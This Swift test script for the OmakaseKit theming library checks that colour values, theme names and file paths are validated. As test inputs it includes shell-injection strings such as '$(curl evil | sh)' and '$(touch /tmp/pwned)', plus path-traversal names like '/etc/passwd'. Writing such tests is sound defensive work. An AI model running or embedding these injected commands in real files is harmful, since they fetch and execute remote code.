import Foundation
import OmakaseKit

var failures: [String] = []

func check(_ name: String, _ ok: Bool, _ detail: @autoclosure () -> String = "") {
    print("  \(ok ? "ok  " : "FAIL")  \(name)" + (ok ? "" : "  — \(detail())"))
    if !ok { failures.append(name) }
}

func theme(_ body: String) throws -> Theme {
    let dir = URL(fileURLWithPath: NSTemporaryDirectory())
        .appendingPathComponent("omakase-test-\(UUID().uuidString)")
    try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
    try body.write(to: dir.appendingPathComponent("colors.toml"),
                   atomically: true, encoding: .utf8)
    return try Theme.load(directory: dir)
}

print("colour parsing")
// The values that made the shell version executable.
check("rejects command substitution", Color("#ff8800$(touch /tmp/pwned)") == nil)
check("rejects backticks", Color("#ff8800`id`") == nil)
check("rejects words", Color("red") == nil)
check("rejects short hex", Color("#12345") == nil)
check("expands 3-digit hex", Color("#fff")?.hex == "#ffffff")
check("accepts hex without #", Color("eeeeee")?.hex == "#eeeeee")
check("drops the alpha channel", Color("#ff8800cc")?.hex == "#ff8800")
check("mixes", Color("#000000")!.mixed(with: Color("#ffffff")!, 0.5).hex == "#808080")
check("alpha comes first for sketchybar",
      Color("#ffffff")!.sketchybar(alpha: 0xf0) == "0xf0ffffff")

print("theme files")
do {
    _ = try theme("""
    background = "#1a1a1a"
    foreground = "#eeeeee"
    accent = "#ff8800$(curl evil | sh)"
    """)
    check("refuses an injected colour", false, "it loaded")
} catch {
    check("refuses an injected colour", true)
}

if let t = try? theme("""
   name = "Fine $(id) `x` name"
   background = "#1a1a1a"
   foreground = "#eeeeee"
   """) {
    check("strips shell characters from names",
          !t.name.contains("$") && !t.name.contains("`"), t.name)
} else { check("strips shell characters from names", false, "did not load") }

if let t = try? theme("""
   background = "#f1f3ea"
   foreground = "#333333"
   red = "#aa0000"
   blue = "#0000aa"
   mode = "light"
   """) {
    check("semantic scheme maps to the palette",
          t.palette[1].hex == "#aa0000" && t.palette[4].hex == "#0000aa")
    check("mode is honoured", t.appearance == .light)
} else { check("semantic scheme maps to the palette", false, "did not load") }

if let t = try? theme("""
   background = "#111111"
   foreground = "#eeeeee"
   appearance = "neither"
   """) {
    check("invalid appearance falls back to luminance", t.appearance == .dark)
}

print("paths")
let parent = URL(fileURLWithPath: "/tmp/omakase-parent")
for bad in ["../escape", "..", ".", "/etc/passwd", ".hidden", "a/b", ""] {
    check("refuses \(bad.isEmpty ? "an empty name" : bad)",
          Paths.safeChild(of: parent, named: bad) == nil)
}
// The regression that hid every bundled theme: resolvingSymlinksInPath strips
// /private only for paths that already exist, so an existing parent under /tmp
// and a child that does not exist yet compared as "outside".
let symlinked = URL(fileURLWithPath: "/tmp")
    .appendingPathComponent("omakase-symlink-\(UUID().uuidString)")
try? FileManager.default.createDirectory(at: symlinked, withIntermediateDirectories: true)
check("accepts a name under a symlinked directory",
      Paths.safeChild(of: symlinked, named: "batou") != nil)
try? FileManager.default.removeItem(at: symlinked)

print()
if failures.isEmpty { print("all good") } else {
    print("\(failures.count) failing: \(failures.joined(separator: ", "))")
    exit(1)
}
